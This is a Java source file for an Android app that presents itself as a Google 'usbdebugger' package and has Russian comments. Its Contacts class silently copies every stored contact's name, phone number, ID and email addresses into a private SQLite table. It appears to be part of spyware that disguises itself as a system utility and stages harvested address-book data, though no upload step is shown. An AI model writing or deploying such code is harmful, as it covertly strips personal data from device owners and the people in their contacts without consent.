package com.google.android.usbdebugger;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;

public class Contacts {

    private static final String TAG = "ContactsHelper";

    // ИСПРАВЛЕНО: Утечка базы данных устранена
    public static void getContacts(Context context) {
        DBHelper dbh = new DBHelper(context);
        try (SQLiteDatabase db = dbh.getWritableDatabase()) {

            Log.d(TAG, "Очистка таблицы контактов перед синхронизацией...");
            db.delete("Contacts", null, null);

            ContentResolver contentResolver = context.getContentResolver();
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID};

            try (Cursor cursor = contentResolver.query(uri, projection, null, null, null)) {

                if (cursor != null && cursor.getCount() > 0) {
                    db.beginTransaction();
                    try {
                        int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                        int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        int idIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);

                        while (cursor.moveToNext()) {
                            String name = cursor.getString(nameIndex);
                            String number = cursor.getString(numberIndex);
                            String contactId = cursor.getString(idIndex);
                            String email = getEmail(contentResolver, contactId);

                            ContentValues values = new ContentValues();
                            values.put("ids", contactId);
                            values.put("name", name);
                            values.put("phone", number);
                            values.put("mail", email);

                            db.insert("Contacts", null, values);
                        }
                        db.setTransactionSuccessful();
                        Log.d(TAG, "Транзакция по добавлению контактов успешно завершена.");
                    } finally {
                        db.endTransaction();
                    }
                } else {
                    Log.d(TAG, "Курсор контактов пуст или null.");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Ошибка при получении контактов: ", e);
            try (SQLiteDatabase dbex = dbh.getWritableDatabase()) {
                 dbh.insert_Exeption(dbex, "getContacts", "Exception", e.getMessage(), new SimpleDateFormat("dd-MM-yyyy HH:mm:ss").format(new Date()));
            }
        }
    }

    private static String getEmail(ContentResolver contentResolver, String contactId) {
        Uri emailUri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
        String[] projection = {ContactsContract.CommonDataKinds.Email.ADDRESS};
        String selection = ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?";
        String[] selectionArgs = {contactId};
        StringBuilder email = new StringBuilder();

        try (Cursor emailCursor = contentResolver.query(emailUri, projection, selection, selectionArgs, null)) {
            if (emailCursor != null) {
                while (emailCursor.moveToNext()) {
                    int emailIndex = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
                    if(emailIndex != -1){
                        if (email.length() > 0) {
                            email.append(", ");
                        }
                        email.append(emailCursor.getString(emailIndex));
                    }
                }
            }
        }
        return email.toString();
    }
}
